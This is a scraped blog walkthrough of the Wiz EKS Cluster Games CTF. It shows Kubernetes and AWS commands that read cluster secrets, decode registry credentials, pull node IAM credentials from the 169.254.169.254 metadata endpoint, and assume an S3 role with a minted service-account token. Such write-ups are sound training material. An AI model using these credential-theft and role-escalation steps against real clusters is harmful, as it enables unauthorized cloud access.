                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
</code></pre>
<p>Looks like we have less access than before.  So not too helpful, lets take a
look at that service account we want to become:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get sa s3access-sa -o json</span>
{
    <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
    <span class="hljs-string">"kind"</span>: <span class="hljs-string">"ServiceAccount"</span>,
    <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"annotations"</span>: {
            <span class="hljs-string">"eks.amazonaws.com/role-arn"</span>: <span class="hljs-string">"arn:aws:iam::688655246681:role/challengeEksS3Role"</span>
        },
        <span class="hljs-string">"creationTimestamp"</span>: <span class="hljs-string">"2023-10-31T20:07:34Z"</span>,
        <span class="hljs-string">"name"</span>: <span class="hljs-string">"s3access-sa"</span>,
        <span class="hljs-string">"namespace"</span>: <span class="hljs-string">"challenge5"</span>,
        <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">"671916"</span>,
        <span class="hljs-string">"uid"</span>: <span class="hljs-string">"86e44c49-b05a-4ebe-800b-45183a6ebbda"</span>
    }
}
</code></pre>
<p>I think we are going to need to use our AWS access to assume that role, I don't
believe our kubernetes access is going to get us anywhere:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test</span>

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
</code></pre>
<p>Ok, so <em>maybe</em> our kubernetes access is important since we can't assume the role
directly.   Lets try to use that $TOKEN from <code>debug-sa</code> to assume the role:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN</span>

An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdentity operation: Incorrect token audience
</code></pre>
<p>Getting closer!   The default audience for a token created with <code>kubectl</code> is
<code>https://kubernetes.default.svc</code> which amazon doesn't seem to like.  Lets try
creating it again with <code>sts.amazonaws.com</code>:</p>
<pre><code class="hljs language-bash"><span class="hljs-built_in">export</span> TOKEN=$(kubectl create token debug-sa --audience sts.amazonaws.com)
root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN</span>
{
    <span class="hljs-string">"Credentials"</span>: {
        <span class="hljs-string">"AccessKeyId"</span>: <span class="hljs-string">"ASIA2AVYNEV&#x3C;*REDACTED*>"</span>,
        <span class="hljs-string">"SecretAccessKey"</span>: <span class="hljs-string">"VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span>,
        <span class="hljs-string">"SessionToken"</span>: <span class="hljs-string">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span>,
        <span class="hljs-string">"Expiration"</span>: <span class="hljs-string">"2023-11-03T05:09:07+00:00"</span>
    },
    <span class="hljs-string">"SubjectFromWebIdentityToken"</span>: <span class="hljs-string">"system:serviceaccount:challenge5:debug-sa"</span>,
    <span class="hljs-string">"AssumedRoleUser"</span>: {
        <span class="hljs-string">"AssumedRoleId"</span>: <span class="hljs-string">"AROA2AVYNEVMZEZ2AFVYI:test"</span>,
        <span class="hljs-string">"Arn"</span>: <span class="hljs-string">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span>
    },
    <span class="hljs-string">"Provider"</span>: <span class="hljs-string">"arn:aws:iam::688655246681:oidc-provider/oidc.eks.us-west-1.amazonaws.com/id/C062C207C8F50DE4EC24A372FF60E589"</span>,
    <span class="hljs-string">"Audience"</span>: <span class="hljs-string">"sts.amazonaws.com"</span>
}
</code></pre>
<p>Success!  We have some new AWS credentials.  Lets setup our new AWS Session:</p>
<pre><code class="hljs language-bash"><span class="hljs-built_in">export</span> AWS_ACCESS_KEY_ID=<span class="hljs-string">"ASIA2AVYNEV&#x3C;*REDACTED*>"</span>
<span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="hljs-string">"VTZ4TuDrtHGca&#x3C;*REDACTED*>"</span>
<span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=<span class="hljs-string">"IQoJb3JpZ2luX2VjEAQaCXVzLXd+7ONV2wIgESXuf&#x3C;*REDACTED*>"</span>

root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>
{
    <span class="hljs-string">"UserId"</span>: <span class="hljs-string">"AROA2AVYNEVMZEZ2AFVYI:test"</span>,
    <span class="hljs-string">"Account"</span>: <span class="hljs-string">"688655246681"</span>,
    <span class="hljs-string">"Arn"</span>: <span class="hljs-string">"arn:aws:sts::688655246681:assumed-role/challengeEksS3Role/test"</span>
}
</code></pre>
<p>We are now the new role!   We hopefully have access to S3 now.  At the start
of the challenge it provided us a clue to what bucket we want to view by
providing us the IAM policy:</p>
<pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"Policy"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"Statement"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-punctuation">{</span>
                <span class="hljs-attr">"Action"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                    <span class="hljs-string">"s3:GetObject"</span><span class="hljs-punctuation">,</span>
                    <span class="hljs-string">"s3:ListBucket"</span>
                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
                <span class="hljs-attr">"Effect"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Allow"</span><span class="hljs-punctuation">,</span>
                <span class="hljs-attr">"Resource"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
                    <span class="hljs-string">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2"</span><span class="hljs-punctuation">,</span>
                    <span class="hljs-string">"arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag"</span>
                <span class="hljs-punctuation">]</span>
            <span class="hljs-punctuation">}</span>
        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"Version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2012-10-17"</span>
    <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>So we want to fetch <code>arn:aws:s3:::challenge-flag-bucket-3ff1ae2/flag</code>:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag .</span>
download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag       
croot@wiz-eks-challenge:~<span class="hljs-comment"># cat flag</span>
wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws&#x3C;*REDACTED*>}
</code></pre>
<p>and thats the final flag! In my next post I'll discuss the remediation steps
to prevent this configuration mistakes on your cluster!</p></div></article></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":["2023","eks_cluster_games_ctf"],"path":"2023/eks_cluster_games_ctf","contentHtml":"\u003cp\u003e\u003ca href=\"https://eksclustergames.com\"\u003eeksclustergames.com\u003c/a\u003e is a new CTF targetted at\nkubernetes vulnerabilities. This is a walk through on how to solve the issues.\u003c/p\u003e\n\u003ch1\u003eChallenge 1\u003c/h1\u003e\n\u003cp\u003eThe first challenge starts off with a clue:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-csharp\"\u003eJumpstart your quest \u003cspan class=\"hljs-keyword\"\u003eby\u003c/span\u003e listing all the secrets \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the cluster.\nCan you spot the flag among them?\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo lets start off by getting the secrets:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get secret \u003c/span\u003e\nNAME         TYPE     DATA   AGE\nlog-rotate   Opaque   1      37h\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince there is only one, lets view it!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get secret -o json\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"v1\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"items\"\u003c/span\u003e: [\n        {\n            \u003cspan class=\"hljs-string\"\u003e\"apiVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"v1\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"data\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"flag\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Secret\"\u003c/span\u003e,\n            \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n                \u003cspan class=\"hljs-string\"\u003e\"creationTimestamp\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:02:08Z\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"log-rotate\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"namespace\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"challenge1\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"resourceVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"890951\"\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e\"uid\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"03f6372c-b728-4c5b-ad28-70d5af8d387c\"\u003c/span\u003e\n            },\n            \u003cspan class=\"hljs-string\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"Opaque\"\u003c/span\u003e\n        }\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"kind\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"List\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"metadata\"\u003c/span\u003e: {\n        \u003cspan class=\"hljs-string\"\u003e\"resourceVersion\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe flag seems to be in \u003ccode\u003e.items[0].data.flag\u003c/code\u003e and is \u003ccode\u003ebase64\u003c/code\u003e encoded so we can\ndecode it as well:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d\u003c/span\u003e\nwiz_eks_challenge{omg_over_privileged_*REDACTED*}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFirst flag found!\u003c/p\u003e\n\u003cp\u003eThis one was definitely a softball but it gets you nice and warmed up on the\nplatform.\u003c/p\u003e\n\u003ch1\u003eChallenge 2\u003c/h1\u003e\n\u003cp\u003eThe hint for this challenge is:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-csharp\"\u003eA thing we learned during our research: always check the container registries.\n\nFor your convenience, the crane utility \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e already pre-installed \u003cspan class=\"hljs-keyword\"\u003eon\u003c/span\u003e the machine.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe first thing I think of when reading this is that it has something to do\nwith the registry a pod is living on.   So lets list the pods and see what is\navailable:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod\u003c/span\u003e\nNAME                    READY   STATUS    RESTARTS   AGE\ndatabase-pod-2c9b3a4e   1/1     Running   0          36h\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWith only one pod as a target, lets get the image for it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod -o json |jq '.items[0].spec.containers[0].image'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"eksclustergames/base_ext_image\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo its on standard \u003ccode\u003edocker.io\u003c/code\u003e registry instead of a private one like I was\nexpecting from the clue.   The second hint was that crane is on the system so\nlets use that to pull the image and inspect it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# crane config eksclustergames/base_ext_image          \u003c/span\u003e\nError: fetching config: reading image \u003cspan class=\"hljs-string\"\u003e\"eksclustergames/base_ext_image\"\u003c/span\u003e: GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich means this is a private image and we are going to need to get some\ncredentials to an account that has access to this image. Usually you have to\ndefine a secret for kubernetes to be able to pull from private registries and\nsince we started off with a secret test first that is where I'm going to go\nnext:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'\u003c/span\u003e\n[\n  {\n    \u003cspan class=\"hljs-string\"\u003e\"name\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"registry-pull-secrets-780bab1d\"\u003c/span\u003e\n  }\n]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo that is the secret we need, lets view it:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.\".dockerconfigjson\"' -r|base64 -d|jq\u003c/span\u003e\n{\n  \u003cspan class=\"hljs-string\"\u003e\"auths\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"index.docker.io/v1/\"\u003c/span\u003e: {\n      \u003cspan class=\"hljs-string\"\u003e\"auth\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ZWtzY2x1c3RlcmdhbWVzOmRj\u0026#x3C;*REDACTED*\u003e200bHI0NWlZUWo4RnVDbw==\"\u003c/span\u003e\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLooks like we've got some more base64 decoding for the actual auth credentials:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# echo \"ZWtzY2x1c3RdhbWVzOmRj\u0026#x3C;*REDACTED*\u003e200bHI0NWlZ4RnVDbw==\" | base64 -d\u003c/span\u003e\neksclustergames:dckr\u0026#x3C;*REDACTED*\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo now we can login with \u003ccode\u003ecrane auth\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# crane auth login -u eksclustergames -p dckr\u0026#x3C;*REDACTED*\u003e docker.io\u003c/span\u003e\n2023/11/03 02:35:49 logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e via /home/user/.docker/config.json\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo if we try to view the image again it should work!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# crane config eksclustergames/base_ext_image|jq\u003c/span\u003e\n{\n  \u003cspan class=\"hljs-string\"\u003e\"architecture\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"amd64\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"config\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"Env\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\u003c/span\u003e\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"Cmd\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"/bin/sleep\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"3133337\"\u003c/span\u003e\n    ],\n    \u003cspan class=\"hljs-string\"\u003e\"ArgsEscaped\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"OnBuild\"\u003c/span\u003e: null\n  },\n  \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:18.920734382Z\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"history\"\u003c/span\u003e: [\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-07-18T23:19:33.538571854Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-07-18T23:19:33.655005962Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"/bin/sh -c #(nop)  CMD [\\\"sh\\\"]\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"empty_layer\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:18.920734382Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' \u003e /flag.txt # buildkit\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"comment\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e\n    },\n    {\n      \u003cspan class=\"hljs-string\"\u003e\"created\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-01T13:32:18.920734382Z\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"created_by\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"CMD [\\\"/bin/sleep\\\" \\\"3133337\\\"]\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"comment\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"buildkit.dockerfile.v0\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"empty_layer\"\u003c/span\u003e: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n    }\n  ],\n  \u003cspan class=\"hljs-string\"\u003e\"os\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"linux\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"rootfs\"\u003c/span\u003e: {\n    \u003cspan class=\"hljs-string\"\u003e\"type\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"layers\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"diff_ids\"\u003c/span\u003e: [\n      \u003cspan class=\"hljs-string\"\u003e\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"\u003c/span\u003e,\n      \u003cspan class=\"hljs-string\"\u003e\"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432\"\u003c/span\u003e\n    ]\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLooks like they leaked the secret right there in the image layers:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-vbnet\"\u003ewiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}\u003cspan class=\"hljs-comment\"\u003e'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo lets submit that and move onto the next one!\u003c/p\u003e\n\u003ch1\u003eChallenge 3\u003c/h1\u003e\n\u003cp\u003eThe hint is:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-vbnet\"\u003eA pod\u003cspan class=\"hljs-comment\"\u003e's image holds more than just code. Dive deep into its ECR repository,\u003c/span\u003e\ninspect the image layers, \u003cspan class=\"hljs-built_in\"\u003eand\u003c/span\u003e uncover the hidden secret.\n\n\u003cspan class=\"hljs-symbol\"\u003eRemember:\u003c/span\u003e You are running inside a compromised EKS pod.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis sounds very similar to the last one but with the hints that its on ECR and\nthat we are in the pod itself it makes me believe we'll have something like IRSA\naccess to AWS from the pod and need to use that to get to it.\u003c/p\u003e\n\u003cp\u003eFirst lets check what pods we are working with:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod\u003c/span\u003e\nNAME                      READY   STATUS    RESTARTS   AGE\naccounting-pod-876647f8   1/1     Running   0          37h\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSo same as the last challenge, lets get the image and see what access we have:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# kubectl get pod -o json |jq '.items[0].spec.containers[0].image'\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich as expected, we do not have access to:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\u003c/span\u003e\nError: fetching config: reading image \u003cspan class=\"hljs-string\"\u003e\"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01\"\u003c/span\u003e: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince I expect the pod already has AWS access, lets check if the AWS CLI works:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts get-caller-identity\u003c/span\u003e\n\nUnable to locate credentials. You can configure credentials by running \u003cspan class=\"hljs-string\"\u003e\"aws configure\"\u003c/span\u003e.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eCredentials are not configured right now, so we need to discover them.  Lets\ncheck if we have metadata server access:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# curl http://169.254.169.254/latest/meta-data/iam\u003c/span\u003e\ninfo\nsecurity-credentials/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe do!  So we should be able to pull the credentials out of there to get access\nto AWS:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq\u003c/span\u003e\n{\n  \u003cspan class=\"hljs-string\"\u003e\"AccessKeyId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"Expiration\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"2023-11-03 03:50:19+00:00\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"SecretAccessKey\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"e4TuLKKPBAVvyPkhKiJG0jO0\u0026#x3C;*REDACTED*\"\u003c/span\u003e,\n  \u003cspan class=\"hljs-string\"\u003e\"SessionToken\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLets set those as environment variables to activate our AWS access:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_ACCESS_KEY_ID=\u003cspan class=\"hljs-string\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_SECRET_ACCESS_KEY=\u003cspan class=\"hljs-string\"\u003e\"e4TuLKKPBAVvyPkhKiJG0jO0\u0026#x3C;*REDACTED*\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e AWS_SESSION_TOKEN=\u003cspan class=\"hljs-string\"\u003e\"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn\u0026#x3C;*REDACTED*\u003e\"\u003c/span\u003e\n\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# aws sts get-caller-identity\u003c/span\u003e\n{\n    \u003cspan class=\"hljs-string\"\u003e\"UserId\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"ASIA2AVYNE\u0026#x3C;*REDACTED*\u003e:i-0cb922c6673973282\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"Account\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"688655246681\"\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e\"Arn\"\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e\"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282\"\u003c/span\u003e\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNow we should be able to authenticate crane and inspect the image from ECR:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# export PASSWORD=$(aws ecr get-login-password)\u003c/span\u003e\nroot@wiz-eks-challenge:~\u003cspan class=\"hljs-comment\"\u003e# crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  \u003c/span\u003e\n2023/11/03 02:56:41 logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e via /home/user/.docker/config.json\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLets get those layers!\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@wiz-eks-challenge:~\u003cspan 